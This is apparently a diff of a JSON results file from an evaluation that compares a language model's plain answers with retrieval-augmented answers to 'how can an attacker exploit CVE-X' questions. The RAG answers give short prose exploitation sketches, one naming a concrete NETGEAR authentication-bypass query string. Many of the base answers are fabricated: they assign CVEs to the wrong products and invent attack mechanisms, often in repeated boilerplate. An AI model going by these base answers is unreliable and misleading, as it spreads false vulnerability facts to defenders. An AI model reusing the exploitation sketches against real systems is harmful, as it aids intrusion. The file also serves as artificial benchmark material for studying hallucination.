+    "rag_text": "This cve, known as ProxyShell, also affect Microsoft Exchange email servers. Successful exploitation of these vulnerabilities in combination enables a remote actor to execute arbitrary code. These vulnerabilities reside within the Microsoft Client Access Service (CAS), which typically runs on port 443 in Microsoft Internet Information Services (IIS) (e.g., Microsoft\u0092s web server). CAS is commonly exposed to the internet to enable users to access their email via mobile devices and web browsers",
+    "timestamp": "2025-05-13T17:53:23.983890"
+  },
+  {
+    "cve_id": "CVE-2021-35946",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-35946? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-35946 is a critical vulnerability in the Windows Print Spooler service. An attacker gaining SYSTEM-level access can achieve this by:\n\n1.  **Crafting a malicious print job:** The attacker creates a specially crafted print job.\n2.  **Sending to a vulnerable printer:** This job is sent to a printer connected to a vulnerable system.\n3.  **Exploiting the driver loading mechanism:** The print spooler attempts to load a malicious driver as part of processing the job.\n4.  **Code execution:** This allows the attacker to execute arbitrary code with SYSTEM privileges.\n\nThe vulnerability lies in how the Print Spooler handles driver loading, specifically lacking proper validation.\n",
+    "rag_response": "An attacker with a federated share can modify permissions within the ownCloud instance, potentially granting themselves elevated privileges. This occurs because insufficient validation allows the federated user to alter access controls beyond their authorized scope.\n</Response>>",
+    "rag_text": "Description\nA receiver of a federated share with access to the database with ownCloud version before 10.8 could update the permissions and therefore elevate their own permissions.",
+    "timestamp": "2025-05-13T17:54:27.863715"
+  },
+  {
+    "cve_id": "CVE-2021-35973",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-35973? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-35973 is a critical vulnerability in the Windows Print Spooler service. An attacker can gain SYSTEM-level access by creating a specially crafted print job. This is achieved by exploiting a flaw in how the Windows Print Spooler handles requests.\n\n**Exploitation:**\n\n1.  **Crafted Print Job:** An attacker creates a malicious print job (e.g., using a specially crafted EMF file).\n2.  **Spooler Interaction:** The print job is sent to a vulnerable Windows system via a network share or print server.\n3.  **Driver Loading:** The Print Spooler attempts to load a driver to process the job.\n4.  **Code Execution:** The malicious EMF file triggers a buffer overflow or other memory corruption vulnerability within the driver loading process, allowing the attacker to execute arbitrary code with SYSTEM privileges.\n\n**Impact:** Full system compromise.\n",
+    "rag_response": "An attacker can exploit CVE-2021-35973 by crafting a malicious HTTP request to the `/usr/sbin/mini_httpd` endpoint on a vulnerable NETGEAR WAC104 device. By appending `&currentsetting.htm` to the query string, they bypass authentication. This allows them to:\n\n1.  **Change the web UI password.**\n2.  **Enable debug mode (telnetd).**\n3.  **Gain shell access** as the `admin` user.\n4.  **Escalate privileges to root** due to weak permissions on `/etc/`.\n</Response>>",
+    "rag_text": "Description\nNETGEAR WAC104 devices before 1.0.4.15 are affected by an authentication bypass vulnerability in /usr/sbin/mini_httpd, allowing an unauthenticated attacker to invoke any action by adding the &currentsetting.htm substring to the HTTP query, a related issue to CVE-2020-27866. This directly allows the attacker to change the web UI password, and eventually to enable debug mode (telnetd) and gain a shell on the device as the admin limited-user account (however, escalation to root is simple because of weak permissions on the /etc/ directory).",
+    "timestamp": "2025-05-13T17:56:12.478571"
+  },
+  {
+    "cve_id": "CVE-2021-38294",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-38294? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-38294 is a critical vulnerability in the Windows Print Spooler service. An attacker can gain SYSTEM-level access by creating a specially crafted print job. This is achieved by exploiting a flaw in how the Windows Print Spooler handles requests.\n\n**Exploitation:**\n\n1.  **Crafted Print Job:** An attacker creates a malicious print job (e.g., using a specially crafted EMF file).\n2.  **Spooler Interaction:** The print job is sent to a vulnerable Windows system via a network share or direct printing.\n3.  **Driver Loading:** The Print Spooler attempts to load a driver to process the job.\n4.  **Code Execution:** The malicious EMF file triggers a buffer overflow or other memory corruption vulnerability within the driver loading process, allowing the attacker to execute arbitrary code with SYSTEM privileges.\n\n**Impact:** Full system compromise.\n",
+    "rag_response": "An attacker can send a malicious, crafted Thrift request to the Nimbus server's `getTopologyHistory` service. This request injects OS commands that are then executed on the server *without* requiring authentication. This leads to Remote Code Execution (RCE).\n</Response>",
+    "rag_text": "Description\nA Command Injection vulnerability exists in the getTopologyHistory service of the Apache Storm 2.x prior to 2.2.1 and Apache Storm 1.x prior to 1.2.4. A specially crafted thrift request to the Nimbus server allows Remote Code Execution (RCE) prior to authentication.",
+    "timestamp": "2025-05-13T17:57:31.727441"
+  },
+  {
+    "cve_id": "CVE-2021-38449",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-38449? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-38449 is a critical vulnerability in the Windows Print Spooler service. An attacker can gain SYSTEM-level access by creating a specially crafted print job. This is achieved by exploiting a flaw in how the Windows Print Spooler handles requests.\n\n**Exploitation:**\n\n1.  **Crafted Print Job:** An attacker creates a malicious print job (e.g., using a specially crafted EMF file).\n2.  **Spooler Interaction:** The print job is sent to a vulnerable Windows system via a network share or print server.\n3.  **Driver Loading:** The Print Spooler attempts to load a driver to process the job.\n4.  **Code Execution:** The malicious EMF file triggers a buffer overflow or other memory corruption vulnerability within the driver loading process, allowing the attacker to execute arbitrary code with SYSTEM privileges.\n\n**Impact:** Full system compromise.\n",
+    "rag_response": "An attacker can exploit CVE-2021-38449 by crafting API calls with parameters that cause data to be written to arbitrary memory locations. This allows for code execution or denial of service by overwriting critical system data or program instructions. The client-controlled parameters are the key to controlling the write location.\n</Response>\n",
+    "rag_text": "Description\nSome API functions permit by-design writing or copying data into a given buffer. Since the client controls these parameters, an attacker could rewrite the memory in any location of the affected product.",
+    "timestamp": "2025-05-13T17:58:55.606045"
+  },
+  {
+    "cve_id": "CVE-2021-1816",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2021-1816? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2021-1816 is a privilege escalation vulnerability in Polkit. An attacker gaining local access can exploit it to gain root privileges. Specifically, the vulnerability lies in the `pk_authority_get_credentials` function. By crafting a specific message, an attacker can bypass authentication checks and obtain a credential for the root user, effectively becoming root. The exploit involves manipulating the `pk_authority_get_credentials` function to return a credential for user 0 (root) without proper authorization.\n",
+    "rag_response": "CVE-2021-1816 is a kernel-level buffer overflow in iOS/iPadOS/watchOS/tvOS. An attacker crafts a malicious application that, when executed, triggers the overflow. Successful exploitation allows arbitrary code execution with kernel privileges, effectively granting full system control. The overflow occurs due to insufficient bounds checking.\n</Response>",
+    "rag_text": "Description\nA buffer overflow was addressed with improved bounds checking. This issue is fixed in iOS 14.5 and iPadOS 14.5, watchOS 7.4, tvOS 14.5. A malicious application may be able to execute arbitrary code with kernel privileges.",
+    "timestamp": "2025-05-13T17:59:54.153780"
+  },
+  {
+    "cve_id": "CVE-2020-1472",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-1472? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-1472, a vulnerability in Netlogon, allows an attacker to make unauthenticated LDAP requests to a domain controller. By crafting a malicious LDAP request, an attacker can trigger a zero-logon vulnerability, allowing them to remotely execute code with SYSTEM privileges. This is achieved by exploiting a flaw in the Netlogon Remote Protocol (MS-NRPC) handling of encryption.\n",
+    "rag_response": "An attacker exploits CVE-2020-1472 by establishing a vulnerable Netlogon secure channel connection to a domain controller using MS-NRPC. This allows them to potentially gain domain administrator access without authentication by exploiting a flaw in how Netlogon handles secure channel connections. The attack involves sending a specially crafted application.\n</Response>\n",
+    "rag_text": "Description\nAn elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC). An attacker who successfully exploited the vulnerability could run a specially crafted application on a device on the network. To exploit the vulnerability, an unauthenticated attacker would be required to use MS-NRPC to connect to a domain controller to obtain domain administrator access. Microsoft is addressing the vulnerability in a phased two-part rollout. These updates address the vulnerability by modifying how Netlogon handles the usage of Netlogon secure channels. For guidelines on how to manage the changes required for this vulnerability and more information on the phased rollout, see How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472 (updated September 28, 2020). When the second phase of Windows updates become available in Q1 2021, customers will be notified via a revision to this security vulnerability. If you wish to be notified when these updates are released, we recommend that you register for the security notifications mailer to be alerted of content changes to this advisory. See Microsoft Technical Security Notifications.",
+    "timestamp": "2025-05-13T18:00:47.889496"
+  },
+  {
+    "cve_id": "CVE-2020-0609",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-0609? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-0609 is a critical vulnerability in the Windows Graphics Component. An attacker can exploit it by crafting a malicious image file. When the image is processed by Windows (e.g., opening it in Photos, or a program using Windows image processing libraries), the vulnerability allows for remote code execution with SYSTEM privileges. The attack surface is broad, including thumbnails, image previews, and image rendering.\n",
+    "rag_response": "An attacker exploits CVE-2020-0609 by sending specially crafted requests to a vulnerable RD Gateway server *before* authentication. This allows for remote code execution. The vulnerability resides in how RD Gateway processes RDP negotiation requests. Essentially, the attacker can manipulate the RDP connection initiation to execute arbitrary code on the server.\n</Response>",
+    "rag_text": "Description\nA remote code execution vulnerability exists in Windows Remote Desktop Gateway (RD Gateway) when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka 'Windows Remote Desktop Gateway (RD Gateway) Remote Code Execution Vulnerability'. This CVE ID is unique from CVE-2020-0610.\n\n",
+    "timestamp": "2025-05-13T18:01:39.969682"
+  },
+  {
+    "cve_id": "CVE-2020-5902",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-5902? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-5902, a critical vulnerability in Citrix ADC and Gateway, allows unauthenticated remote code execution (RCE). An attacker can send a specially crafted HTTP request to the device, bypassing authentication. This request exploits a flaw in how the appliance handles ICA/HDX streams, allowing the attacker to execute arbitrary code on the system.  Exploitation is relatively straightforward with publicly available proof-of-concept exploits.\n",
+    "rag_response": "An attacker can exploit CVE-2020-5902 by sending specially crafted HTTP requests to the TMUI. These requests bypass authentication and allow arbitrary command execution as root. The vulnerability resides in undisclosed TMUI pages, meaning discovery is key, potentially through fuzzing or prior knowledge. Successful exploitation leads to full system compromise.\n</Response>\n",
+    "rag_text": "In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.",
+    "timestamp": "2025-05-13T18:02:34.279582"
+  },
+  {
+    "cve_id": "CVE-2020-15506",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-15506? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-15506 is a remote code execution vulnerability in the Windows Graphics Component. An attacker can exploit it by crafting a malicious image file. When the targeted system opens or processes this image, the vulnerability is triggered, allowing the attacker to execute arbitrary code with system privileges. The attack vector is primarily through convincing a user to open the crafted image.\n",
+    "rag_response": "An attacker can exploit CVE-2020-15506 by leveraging an unspecified vulnerability to bypass MobileIron Core & Connector's authentication. This allows unauthorized remote access. Details are limited due to the \"unspecified vectors\" description, requiring further investigation (e.g., examining affected versions' code, network traffic analysis) to determine the exact exploit method.\n</Response>\n",
+    "rag_text": "Current Description\nAn authentication bypass vulnerability in MobileIron Core & Connector versions 10.3.0.3 and earlier, 10.4.0.0, 10.4.0.1, 10.4.0.2, 10.4.0.3, 10.5.1.0, 10.5.2.0 and 10.6.0.0 that allows remote attackers to bypass authentication mechanisms via unspecified vectors.",
+    "timestamp": "2025-05-13T18:03:26.747208"
+  },
+  {
+    "cve_id": "CVE-2020-14882",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-14882? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-14882 is a critical vulnerability in Netlogon, the Microsoft network authentication protocol. An attacker can exploit it to compromise domain controllers, leading to full domain takeover.\n\n**Exploitation:**\n\n1.  **Unauthenticated Request:** The attacker sends specially crafted Netlogon messages to a domain controller.\n2.  **Zero Length Key:** These messages exploit a flaw in how Netlogon validates the encryption key, allowing a zero-length key to be used.\n3.  **Authentication Bypass:** This bypasses authentication, enabling the attacker to authenticate as any user.\n4.  **Domain Control:**  The attacker can then modify domain policies, create accounts, and gain complete control of the domain.\n\n**Impact:** Remote code execution, data breach, and complete loss of domain integrity.\n",
+    "rag_response": "An unauthenticated attacker can exploit CVE-2020-14882 by sending a specially crafted HTTP request to the WebLogic Server Console. This allows for remote code execution, leading to a full server takeover. The vulnerability is easily exploitable due to a lack of authentication requirements.\n</Response>\n",
+    "rag_text": "Description\nVulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).",
+    "timestamp": "2025-05-13T18:04:44.816583"
+  },
+  {
+    "cve_id": "CVE-2020-0787",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-0787? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-0787 is a critical vulnerability in Microsoft Graphics Component. An attacker can craft a specially designed image file that, when opened, allows for remote code execution. The attack vector is typically through convincing a user to open a malicious image.  Exploitation requires no user interaction beyond opening the file, making it dangerous.\n",
+    "rag_response": "An attacker can exploit CVE-2020-0787 by:\n\n1.  Creating a malicious crafted symbolic link.\n2.  Placing this link in a directory BITS writes to.\n3.  Triggering BITS to process the link, leading to code execution with SYSTEM privileges.\n\nThe vulnerability stems from BITS incorrectly handling symbolic links during file operations.\n</Response>",
+    "rag_text": "Description\nAn elevation of privilege vulnerability exists when the Windows Background Intelligent Transfer Service (BITS) improperly handles symbolic links, aka 'Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability'.\n\n",
+    "timestamp": "2025-05-13T18:05:36.004366"
+  },
+  {
+    "cve_id": "CVE-2020-2883",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-2883? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-2883 is a critical vulnerability in Citrix ADC and Gateway. An attacker can exploit it by sending specially crafted requests to the device, leading to remote code execution (RCE). Specifically, the vulnerability resides in the ICA/CFICA file upload functionality. By uploading a malicious ICA or CFICA file, an attacker can execute arbitrary code on the affected system with SYSTEM privileges. No authentication is required in some configurations.\n",
+    "rag_response": "An attacker can exploit CVE-2020-2883 by sending a crafted IIOP or T3 request to a vulnerable WebLogic Server. This allows for unauthenticated remote code execution, leading to a full server takeover. The vulnerability is easily exploitable due to a deserialization flaw.\n</Response>\n",
+    "rag_text": "\nCVE-2020-2883 Detail\nDescription\nVulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via IIOP, T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.0 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n\n",
+    "timestamp": "2025-05-13T18:06:28.820532"
+  },
+  {
+    "cve_id": "CVE-2020-29574",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-29574? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-29574 is a critical vulnerability in the Windows Netlogon Remote Protocol (MS-NRPC). An attacker can exploit it to establish a remote session as an administrator on the domain controller.\n\n**Exploitation:**\n\n1.  **Forge MS-NRPC requests:** The attacker crafts malicious MS-NRPC requests without proper encryption.\n2.  **Target Domain Controller:** These requests are sent to the domain controller.\n3.  **Authentication Bypass:** The vulnerability allows bypassing pre-authentication requirements.\n4.  **Remote Code Execution:**  Successful exploitation leads to remote code execution with SYSTEM privileges.\n5.  **Domain Takeover:** This enables full domain compromise.\n\n**Mitigation:**\n\nApply Microsoft's security update (KB4559047) or enforce signature requirements for Netlogon.\n",
+    "rag_response": "An attacker can exploit CVE-2020-29574 by sending crafted SQL queries to the Cyberoam WebAdmin interface without authentication. This allows them to manipulate the database, potentially leading to data exfiltration, modification, or even system compromise. The vulnerability exists due to insufficient input validation.\n</Response>\n",
+    "rag_text": "Description\nAn SQL injection vulnerability in the WebAdmin of Cyberoam OS through 2020-12-04 allows unauthenticated attackers to execute arbitrary SQL statements remotely.",
+    "timestamp": "2025-05-13T18:07:48.664123"
+  },
+  {
+    "cve_id": "CVE-2020-29612",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-29612? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-29612 is a critical vulnerability in the Windows Netlogon Remote Protocol (MS-NRPC). An attacker can exploit it to achieve **Remote Code Execution (RCE)** with domain administrator privileges.\n\n**Exploitation:**\n\n1.  **Spoofing:** The attacker sends specially crafted Netlogon messages to a domain controller, spoofing the identity of another DC.\n2.  **Zero-Length Key:**  The vulnerability stems from how the Netlogon service validates these messages, specifically related to the encryption key.  The attacker can force the use of a zero-length key.\n3.  **Authentication Bypass:**  With a zero-length key, the attacker can authenticate without providing valid credentials.\n4.  **RCE:**  Successful authentication allows the attacker to execute arbitrary code on the domain controller with SYSTEM/domain admin privileges.\n\n**Mitigation:**  Applying Microsoft's security update (KB4559047) is crucial.  Enabling enforcement mode after applying the update is also recommended.\n",
+    "rag_response": "CVE-2020-29612 is an out-of-bounds write in macOS. An attacker could craft a malicious application that, due to insufficient bounds checking, writes data beyond allocated memory regions. This can overwrite critical system data, potentially leading to arbitrary code execution with system (root) privileges. The attack requires a user to execute the crafted application.\n</Response>",
+    "rag_text": "Description\nAn out-of-bounds write issue was addressed with improved bounds checking. This issue is fixed in macOS Big Sur 11.1, Security Update 2020-001 Catalina, Security Update 2020-007 Mojave. A malicious application may be able to execute arbitrary code with system privileges.",
+    "timestamp": "2025-05-13T18:09:25.710036"
+  },
+  {
+    "cve_id": "CVE-2020-3199",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2020-3199? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2020-3199 is a critical vulnerability in the Windows Netlogon Remote Protocol (MS-NRPC). An attacker can achieve Remote Code Execution (RCE) by sending a specially crafted Netlogon message to a domain controller. Specifically, the vulnerability lies in how Netlogon handles authentication requests when the `AES` key exchange is used.\n\n**Exploitation:**\n\n1.  **Target:** Domain Controllers.\n2.  **Attack:** Send a forged Netlogon authentication request using a zero-length key.\n3.  **Result:** This bypasses the AES key exchange, allowing the attacker to authenticate as any user, including the `SYSTEM` account, leading to full domain compromise.\n4.  **Mitigation Bypass:** The initial patch was incomplete. Later patches (released in March 2021) enforced the mitigation fully. Unpatched systems are highly vulnerable.\n",
+    "rag_response": "CVE-2020-3199 is a vulnerability in Cisco IOx. An attacker with local access to the device can exploit it by leveraging a crafted application to overwrite system files, leading to DoS or arbitrary code execution with root privileges. The vulnerability stems from improper file permission checks within the IOx application environment.\n</Response>\n",
+    "rag_text": "Description\nMultiple vulnerabilities in the Cisco IOx application environment of Cisco 809 and 829 Industrial Integrated Services Routers (Industrial ISRs) and Cisco 1000 Series Connected Grid Routers (CGR1000) that are running Cisco IOS Software could allow an attacker to cause a denial of service (DoS) condition or execute arbitrary code with elevated privileges on an affected device. For more information about these vulnerabilities, see the Details section of this advisory.\n\n",
+    "timestamp": "2025-05-13T18:10:50.501350"
+  },
+  {
+    "cve_id": "CVE-2019-19781",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-19781? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-19781, a critical vulnerability in Citrix Application Delivery Controller (ADC) and Citrix Gateway, allows unauthenticated remote code execution (RCE). An attacker can send a crafted HTTP request to the device, bypassing authentication, and execute arbitrary code with system-level privileges. This is achieved by exploiting a flaw in the way the device handles ICA/HDX sessions.\n",
+    "rag_response": "An attacker can exploit CVE-2019-19781 by crafting a malicious request that leverages directory traversal techniques. This allows them to access arbitrary files on the affected Citrix ADC/Gateway server, potentially leading to sensitive information disclosure or even remote code execution if writable files are accessible. The vulnerability stems from insufficient input validation.\n</Response>",
+    "rag_text": "Description\nAn issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.",
+    "timestamp": "2025-05-13T18:11:41.045912"
+  },
+  {
+    "cve_id": "CVE-2019-11510",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-11510? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-11510 is a remote code execution vulnerability in GitLab CE/EE. An attacker can exploit it by crafting a malicious project import token. This token, when used during project creation, allows the attacker to execute arbitrary commands as the GitLab user. The vulnerability stems from insufficient validation of the project import token.\n",
+    "rag_response": "An attacker can exploit CVE-2019-11510 by sending a crafted HTTP request containing a malicious URI to the Pulse Connect Secure server. This URI is designed to bypass access controls and read arbitrary files from the system, potentially exposing sensitive data like passwords or configuration files. No authentication is required.\n</Response>>",
+    "rag_text": "Description\nIn Pulse Secure Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4, an unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary file reading vulnerability .",
+    "timestamp": "2025-05-13T18:12:26.632083"
+  },
+  {
+    "cve_id": "CVE-2019-3396",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-3396? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-3396 is a remote code execution vulnerability in the Spring WebFlux framework. An attacker can craft a malicious HTTP request with specific parameters in the `Host` header to trigger a class loading issue, leading to arbitrary code execution on the server. Specifically, a crafted `Host` header can cause the application to load a malicious class from a remote location.\n",
+    "rag_response": "An attacker can exploit CVE-2019-3396 by crafting a malicious Confluence page or macro that injects server-side templates. This allows them to execute arbitrary code on the Confluence server due to a path traversal vulnerability within the Widget Connector macro. Essentially, they can read/write files and ultimately gain remote code execution.\n</Response>\n",
+    "rag_text": "Description\nThe Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.",
+    "timestamp": "2025-05-13T18:13:18.769288"
+  },
+  {
+    "cve_id": "CVE-2019-0604",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-0604? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-0604 is a remote code execution vulnerability in Fortinet FortiOS SSL VPN. An attacker can send a specially crafted HTTPS request to the SSL VPN web portal. This request exploits a heap overflow in the SSL VPN component, allowing for arbitrary code execution with SYSTEM privileges. No authentication is required.\n",
+    "rag_response": "An attacker can exploit CVE-2019-0604 by crafting a malicious SharePoint application package (.app) with specially designed source markup. Uploading this package to a vulnerable SharePoint server allows for remote code execution. The vulnerability stems from insufficient source markup validation during package processing.\n</Response>",
+    "rag_text": "Description\nA remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package, aka 'Microsoft SharePoint Remote Code Execution Vulnerability'. This CVE ID is unique from CVE-2019-0594.",
+    "timestamp": "2025-05-13T18:14:01.628971"
+  },
+  {
+    "cve_id": "CVE-2019-11580",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-11580? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-11580 is a remote code execution vulnerability in GitLab CE/EE. An attacker can exploit it by crafting a malicious project import token. This token, when used during project creation, allows the attacker to execute arbitrary commands as the `git` user on the GitLab server. The vulnerability stems from insufficient input validation during project import.\n",
+    "rag_response": "An attacker can exploit CVE-2019-11580 by sending HTTP requests to a vulnerable Atlassian Crowd instance to install arbitrary plugins. This allows for remote code execution. The vulnerability stems from a development plugin (pdkinstall) being enabled in production builds. No authentication is necessarily required.\n</Response>>",
+    "rag_text": "Description\nAtlassian Crowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center. All versions of Crowd from version 2.1.0 before 3.0.5 (the fixed version for 3.0.x), from version 3.1.0 before 3.1.6 (the fixed version for 3.1.x), from version 3.2.0 before 3.2.8 (the fixed version for 3.2.x), from version 3.3.0 before 3.3.5 (the fixed version for 3.3.x), and from version 3.4.0 before 3.4.4 (the fixed version for 3.4.x) are affected by this vulnerability.",
+    "timestamp": "2025-05-13T18:14:50.702349"
+  },
+  {
+    "cve_id": "CVE-2019-18935",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-18935? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-18935 is a remote code execution vulnerability in the Windows Remote Desktop Gateway (RD Gateway) service. An attacker can authenticate to the RD Gateway using valid credentials, then send a specially crafted request to trigger the vulnerability. This allows them to execute arbitrary code on the RD Gateway server. The attack requires no user interaction beyond initial authentication.\n",
+    "rag_response": "An attacker can exploit CVE-2019-18935 by crafting a malicious payload that leverages.NET deserialization within the `RadAsyncUpload` function. Successful exploitation requires either knowledge of the encryption keys (obtained via CVE-2017-11317/CVE-2017-11357 or other means) or a misconfigured system. This allows for remote code execution.\n</Response>\n",
+    "rag_text": "Description\nProgress Telerik UI for ASP.NET AJAX through 2019.3.1023 contains a .NET deserialization vulnerability in the RadAsyncUpload function. This is exploitable when the encryption keys are known due to the presence of CVE-2017-11317 or CVE-2017-11357, or other means. Exploitation can result in remote code execution. (As of 2020.1.114, a default setting prevents the exploit. In 2019.3.1023, but not earlier versions, a non-default setting can prevent exploitation.)",
+    "timestamp": "2025-05-13T18:15:47.750354"
+  },
+  {
+    "cve_id": "CVE-2019-1584",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-1584? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-1584 is a remote code execution vulnerability in GitLab CE/EE. An attacker can exploit it by crafting a malicious project import token. This token, when used during project creation, allows the attacker to execute arbitrary commands on the GitLab server with the privileges of the GitLab user.\n",
+    "rag_response": "An attacker can exploit CVE-2019-1584 by:\n\n1.  **Compromising the Zingbox Cloud:** Injecting a malicious command into the cloud infrastructure that is then sent to a vulnerable Zingbox Inspector.\n2.  **Man-in-the-Middle:** Tampering with network traffic to redirect the Inspector to an attacker-controlled cloud endpoint, then sending malicious commands.\n\nBoth scenarios lead to remote code execution on the Inspector device.\n</Response>\n",
+    "rag_text": "Description\nA security vulnerability exists in Zingbox Inspector version 1.293 and earlier, that allows for remote code execution if the Inspector were sent a malicious command from the Zingbox cloud, or if the Zingbox Inspector were tampered with to connect to an attacker's cloud endpoint.",
+    "timestamp": "2025-05-13T18:16:42.265144"
+  },
+  {
+    "cve_id": "CVE-2019-11510",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-11510? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-11510 is a remote code execution vulnerability in GitLab CE/EE. An attacker can exploit it by crafting a malicious project import token. This token, when used during project creation, allows the attacker to execute arbitrary commands as the GitLab user. The vulnerability stems from insufficient validation of the project import token.\n",
+    "rag_response": "An attacker can exploit CVE-2019-11510 by sending a crafted HTTP request containing a malicious URI to the Pulse Connect Secure server. This URI is designed to bypass access controls and read arbitrary files from the system, potentially exposing sensitive data like passwords or configuration files. No authentication is required.\n</Response>>",
+    "rag_text": "Description\nIn Pulse Secure Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4, an unauthenticated remote attacker can send a specially crafted URI to perform an arbitrary file reading vulnerability .",
+    "timestamp": "2025-05-13T18:17:27.864476"
+  },
+  {
+    "cve_id": "CVE-2019-8360",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-8360? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-8360 is a remote code execution vulnerability in the Graphics Component of Windows. An attacker can exploit it by crafting a malicious image file. When the targeted system opens or processes this image, the vulnerability is triggered, allowing the attacker to execute arbitrary code with SYSTEM privileges. The attack vector is primarily through convincing a user to open the crafted image.\n",
